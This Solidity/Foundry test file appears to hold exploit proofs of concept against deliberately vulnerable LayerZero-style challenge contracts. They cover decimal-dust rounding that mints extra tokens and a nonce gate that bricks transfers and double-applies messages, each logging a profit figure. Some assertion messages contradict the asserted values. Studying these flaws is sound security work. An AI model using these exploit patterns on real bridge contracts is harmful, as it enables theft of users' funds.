// SPDX-License-Identifier: MIT
// Exploit tests for LayerZero batch 3: OFT shared-decimal dust inflation and
// application-side nonce-ordering bypass.
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {LayerZeroOftDecimalDust, SixDecimalToken} from "../src/challenges/LayerZeroOftDecimalDust.sol";
import {LayerZeroNonceOrdering, DustToken} from "../src/challenges/LayerZeroNonceOrdering.sol";

contract LayerZeroDustNonceTest is Test {
    function test_oftDecimalDust_subUnitSpam() public {
        SixDecimalToken six = new SixDecimalToken();
        address endpoint = makeAddr("endpoint");
        LayerZeroOftDecimalDust oft = new LayerZeroOftDecimalDust(address(six), endpoint);
        address attacker = makeAddr("attacker");

        // 1e11 local (0.0000000001 tokens) — BELOW one shared unit (1e12).
        // Honest OFT: rounds to 0 shared units, dust dropped. Buggy ceil: 1.
        six.mint(attacker, 100_000_000_000); // 1e11
        vm.startPrank(attacker);
        six.approve(address(oft), type(uint256).max);
        oft.bridgeOut(100_000_000_000);
        vm.stopPrank();
        assertEq(oft.bridgedDebit(attacker), 1, "sub-unit must round DOWN to zero shared units");

        // Destination mints 1 full shared unit = 1e12 local: 10x the input.
        vm.prank(endpoint);
        oft.bridgeIn(attacker, 1);
        assertEq(six.balanceOf(attacker), 1_000_000_000_000, "round-up minted 10x the bridged value");
        assertGt(six.balanceOf(attacker), 100_000_000_000, "no net value created");
        console2.log("[PROFIT_WEI]", uint256(900_000_000_000)); // 1e12 - 1e11 created per hop
    }

    function test_oftDecimalDust_residueSkim() public {
        SixDecimalToken six = new SixDecimalToken();
        address endpoint = makeAddr("endpoint");
        LayerZeroOftDecimalDust oft = new LayerZeroOftDecimalDust(address(six), endpoint);
        address attacker = makeAddr("attacker");

        // (b) RESIDUE: 1.5M shared units + 1 wei of dust. Honest floor =
        // 1_500_000 shared units (dust dropped); buggy ceil = 1_500_001 —
        // one wei of dust becomes a full shared unit (1e12 local wei).
        six.mint(attacker, 1_500_000_000_000_000_001); // 1.5M shared units + 1 wei
        vm.startPrank(attacker);
        six.approve(address(oft), type(uint256).max);
        oft.bridgeOut(1_500_000_000_000_000_001);
        vm.stopPrank();
        assertEq(oft.bridgedDebit(attacker), 1_500_001, "dust must round DOWN, honest floor is 1_500_000");

        vm.prank(endpoint);
        oft.bridgeIn(attacker, 1_500_001);
        assertEq(six.balanceOf(attacker), 1_500_001_000_000_000_000, "dust rounded up to a full shared unit");
        assertGt(six.balanceOf(attacker), 1_500_000_000_000_000_001, "residue skim created value");
        console2.log("[PROFIT_WEI]", uint256(999_999_999_999)); // ~1e12 created per hop
    }

    function test_nonceOrdering_outOfOrderDoubleApply() public {
        DustToken dst = new DustToken();
        address endpoint = makeAddr("endpoint");
        LayerZeroNonceOrdering oapp = new LayerZeroNonceOrdering(address(dst), endpoint);
        address victim = makeAddr("victim");
        bytes32 peer = bytes32(uint256(uint160(address(oapp))));
        uint256 amount = 100 ether;

        // ATTACK 1 — SEQUENCE BRICKING: the FIRST delivery carries nonce 5,
        // burning nonces 1-4. The victim's four in-flight transfers (nonces
        // 1-4, already verified by the endpoint) are now permanently stale:
        vm.prank(endpoint);
        oapp.lzReceive(30101, peer, 5, victim, amount);
        assertEq(dst.balanceOf(victim), amount, "first delivery applies");

        for (uint64 n = 1; n <= 4; n++) {
            vm.prank(endpoint);
            vm.expectRevert(bytes("stale nonce"));
            oapp.lzReceive(30101, peer, n, victim, amount);
        }
        assertEq(dst.balanceOf(victim), amount, "4 in-flight transfers bricked forever");

        // ATTACK 2 — GAP-NONCE DOUBLE APPLY: the same logical transfer keeps
        // applying under every fresh nonce — the gate counts positions, not
        // message identity:
        vm.prank(endpoint);
        oapp.lzReceive(30101, peer, 6, victim, amount);
        vm.prank(endpoint);
        oapp.lzReceive(30101, peer, 7, victim, amount);
        assertEq(dst.balanceOf(victim), 3 * amount, "identity-less gate re-applies the same transfer");
        console2.log("[PROFIT_WEI]", uint256(200 ether));
    }
}
